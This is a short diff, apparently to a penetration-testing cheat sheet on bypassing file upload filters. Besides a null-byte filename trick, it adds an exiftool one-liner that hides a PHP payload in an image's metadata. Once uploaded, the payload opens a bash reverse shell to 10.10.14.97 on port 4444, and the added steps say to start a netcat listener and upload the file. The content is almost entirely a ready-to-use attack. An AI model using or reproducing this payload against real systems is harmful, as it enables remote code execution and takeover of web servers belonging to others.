@@ -81,9 +81,16 @@ Then, add a shell extension to make it an executable file once in the web app se
 $ mv catphoto.jpg catphoto.php\x00.jpghe
 ```
 
+### PHP one liner to code execution
 
+{% code overflow="wrap" %}
+```
+exiftool -DocumentName="<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.10.14.97/4444 0>&1'\"); ?>" index.php.jpeg
+```
+{% endcode %}
 
-
+* Start a netcat listener
+* Upload the file to the server
 
 
 
